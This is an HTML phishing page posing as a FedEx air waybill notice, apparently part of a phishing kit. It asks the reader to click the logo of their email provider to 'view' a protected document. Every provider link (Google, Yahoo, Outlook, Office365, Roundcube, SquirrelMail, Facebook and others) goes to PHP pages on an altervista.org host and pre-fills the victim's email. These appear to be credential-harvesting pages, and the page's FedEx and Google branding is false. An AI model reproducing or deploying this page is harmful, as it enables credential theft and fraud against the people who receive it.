<html><head><title>Fedex Global Delivery</title>
<meta content="text/html; charset=utf-8" http-equiv=Content-Type>
<meta name=GENERATOR content="MSHTML 11.00.9600.18639"></head>
<body>
<div id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3486" dir="ltr">
<table id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3488" border="0" cellspacing="0" cellpadding="0" bgcolor="#ffffff">
<tbody id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3490">
<tr id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3492">
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3494" valign="top" width="100%">
<p><img src="https://ci5.googleusercontent.com/proxy/o4NFoYI6KWnap7tHsUrUjlm0bXD87fDiLJfz8Jc4e1H9CIqEJ1HCD3EVBfJ9sOGkEE8pi6ZH5V9T7bSWFRbZxxyQxnp-AprhtoyIsVdmhTLnU8jJFACOEe08haB5pHULaXM7G63Z=s0-d-e1-ft#http://images.fedex.com/images/us/office/nexgen09/HomePage/logo-header-fedex.png" alt="FedEx Home" width="229" height="134" /></p>
<p>ATTENTION:<!--?php echo $_GET['email']; // output 2489 ?--></p>
<p>&nbsp;</p>
<p>You are about to view Air way bill B02171. <em><strong>AirwaBill Note! </strong></em></p>
<p><em>Our Document are highly protected from unauthorized viewer. </em></p>
<p><em>Please click on the logo that signifies your email domain to view and download</em><strong><em> .</em></strong></p>
</td>
</tr>
<tr id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3496">
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3498" align="center" valign="top" width="100%">&nbsp;</td>
</tr>
<tr id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3610">
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3612" width="100%">
<table id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3614" border="0" cellspacing="0" cellpadding="0" align="left">
<tbody id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3616">
<tr id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3618">
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3620" align="left" valign="top" width="100%">
<p><strong><em>If you wish to view that attached file through your email, Please click on logo that signifies your email hosters.<br /></em></strong></p>
<p><strong><em>This process is to confirm that you are a human not a robot</em></strong></p>
</td>
</tr>
</tbody>
</table>
</td>
</tr>
<tr id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3634">
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3636" align="left" valign="top" width="100%">
<table id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3638" border="1" width="1551" cellspacing="0" cellpadding="0">
<tbody id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3640">
<tr id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3642">
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3644" valign="top" width="139">
<p><a title="View Document" href="http://icttoolssales.altervista.org/horde/horde.php?email=&lt;?php echo $_GET['email']; // output 2489 ?&gt;" target="_blank"><img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3645" src="https://webmail.opentransfer.com/horde/themes/graphics/horde-power1.png" alt="Download" width="117" height="76" /></a></p>
<p>Powered by Horde</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3647" valign="top" width="138">
<p><a title="Open With Google Doc" href="http://icttoolssales.altervista.org/squirel/squirel.php?email=&lt;?php echo $_GET['email']; // output 2489 ?&gt;" target="_blank"><img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3672" src="https://squirrelmail.org/images/sm_logo.jpg" alt="Inline image 6" width="129" height="37" /></a></p>
<p>Powered by Squirrel Mail</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3650" valign="top" width="108"><a title="View Document" href="http://icttoolssales.altervista.org/webmaildark/webmaildark.php?email=&lt;?php echo $_GET['email']; // output 2489 ?&gt;" target="_blank"><img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3657" src="http://icttoolssales.altervista.org/webmaildark/webmaildark.png" alt="Inline image 1" width="200" height="200" /></a>&nbsp;
<p>Powered by Webmail</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3653" valign="top" width="28">
<p>&nbsp;</p>
<p><a title="View Document" href="http://icttoolssales.altervista.org/roundcub/roundcubeDark.php?email=&lt;?php echo $_GET['email']; // output 2489 ?&gt;" target="_blank"><img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3654" src="https://roundcube.net/images/logo.png" alt="Inline image 2" width="73" height="75" /></a></p>
<p>Powered by round cube&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3656" valign="top" width="28">
<p><a title="View Document" href="http://icttoolssales.altervista.org/office365/office.php?email=&lt;?php echo $_GET['email']; // output 2489 ?&gt;" target="_blank"><img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3657" src="https://encrypted-tbn1.gstatic.com/images?q=tbn:ANd9GcTcLxl8_RYNzpNkf9wuPsou6G8Gcx1zOIHCk1FGWouIpHrkaWDm2w" alt="Inline image 1" width="77" height="69" /></a></p>
<p>Powered by Outlook Mail</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3659" valign="top" width="28">
<p><a title="Click to open AWB" href="http://icttoolssales.altervista.org/webmailwite/webmailwhite.php?email=&lt;?php echo $_GET['email']; // output 2489 ?&gt;" target="_blank"><span id="gmail-m_7863347401620785325goog_1620505688"></span><img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3660" src="http://icttoolssales.altervista.org/webmailwite/WhiteWebmail.png" alt="logo" width="160" height="136" /><span id="gmail-m_7863347401620785325goog_1620505689"></span></a></p>
<p>Powered by Webmail</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3662" valign="top" width="28">
<p><a title="Open with Google Drive" href="http://icttoolssales.altervista.org/NewFolder/gma/gmala.php?email=&lt;?php echo $_GET['email']; // output 2489 ?&gt;" target="_blank"><img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3482" title="Google" src="https://ssl.gstatic.com/images/branding/googlelogo/1x/googlelogo_color_112x36dp.png" alt="Google" width="68" height="68" border="0" /></a></p>
<p>Powered by Google</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3665" valign="top" width="28">
<p><a title="View Document" href="http://icttoolssales.altervista.org/NewFolder/yaho/ymal.php?email=&lt;?php echo $_GET['email']; // output 2489 ?&gt;" target="_blank"><img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3657" src="https://s1.yimg.com/rz/d/yahoo_en-US_f_p_bestfit_2x.png" alt="Inline image 1" width="77" height="69" /></a></p>
<p>Yahoo!</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3668" valign="top" width="28">
<p>&nbsp;</p>
<!--Begin Comm100 Live Chat Code--> <!--End Comm100 Live Chat Code-->
<p>&nbsp;</p>
<p>Powered by <a href="http://126.COM" target="_blank">126.COM</a>,</p>
<p><a href="http://163.COM" target="_blank">163.COM</a>,</p>
<p><a href="http://QQ.COM" target="_blank">QQ.COM</a></p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3671" valign="top" width="28">
<p>&nbsp;</p>
<p><a title="Open with Google Drive">" target="_blank"&gt;<img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_" title="Google" src="http://icttoolssales.altervista.org/ali/Alibab.png" alt="Google" width="107" height="149" border="0" /></a></p>
<p>Powered by Alibaba</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3674" valign="top" width="28">
<p><a href="http://icttoolssales.altervista.org/enerprwebmail/webmail.php?email=&lt;?php echo $_GET['email']; // output 2489 ?&gt;" target="_blank"><img src="https://webmail.logix.in/images/img-left.jpg" alt="http://jdelivery.rediff.com/ajaxprism/pix_1_3/lsprite.png" width="107" height="145" /></a></p>
<p id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3676">Powered by Enerprwebmail</p>
</td>
<td id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3678" valign="top" width="28">
<p>&nbsp;</p>
<p><a href="http://icttoolssales.altervista.org/outlok/hot.php?email=&lt;?php echo $_GET['email']; // output 2489 ?&gt;" target="_blank"><img src="http://icttoolssales.altervista.org/outlok/hot.png" alt="http://jdelivery.rediff.com/ajaxprism/pix_1_3/lsprite.png" width="107" height="145" /></a></p>
<p>Powered by Outlook/Hotmail</p>
</td>
<td valign="top" width="28">
<p>&nbsp;</p>
<a href="http://icttoolssales.altervista.org/facebook/facebook.php?email=&lt;?php echo $_GET['email']; // output 2489 ?&gt;" target="_blank"><img src="https://webmail.logix.in/images/img-left.jpg" alt="http://jdelivery.rediff.com/ajaxprism/pix_1_3/lsprite.png" width="107" height="145" /></a></td>
<td valign="top" width="28">&nbsp;</td>
<td valign="top" width="28">&nbsp;</td>
</tr>
<tr>
<td valign="top" width="139">
<p><img id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3669" src="http://icttoolssales.altervista.org/NewFolder/126.png" alt="Image result for general webmail email logo" width="106" height="102" name="m_7863347401620785325_m_-5634999287369908768_m_-7189950888858518771_14f82c7d44de2fb3_EXLJk_G32ory3M:" /></p>
</td>
<td valign="top" width="138">&nbsp;</td>
<td valign="top" width="108">&nbsp;</td>
<td valign="top" width="28">&nbsp;</td>
<td valign="top" width="28">&nbsp;</td>
<td valign="top" width="28">&nbsp;</td>
<td valign="top" width="28">&nbsp;</td>
<td valign="top" width="28">&nbsp;</td>
<td valign="top" width="28">&nbsp;</td>
<td valign="top" width="28">&nbsp;</td>
<td valign="top" width="28">&nbsp;</td>
<td valign="top" width="28">&nbsp;</td>
<td valign="top" width="28">&nbsp;</td>
<td valign="top" width="28">&nbsp;</td>
<td valign="top" width="28">&nbsp;</td>
</tr>
</tbody>
</table>
</td>
</tr>
</tbody>
</table>
<span id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3682">&copy; 2013 Google Inc. 1600 Amphitheatre Parkway, Mountain View, CA 94043</span> <br id="gmail-m_7863347401620785325gmail-m_-5634999287369908768gmail-m_-7189950888858518771yui_3_16_0_1_1441042556426_3686" />You have received this mandatory email service announcement to update you about important changes to your Google Apps product or account.</div>
</body></html>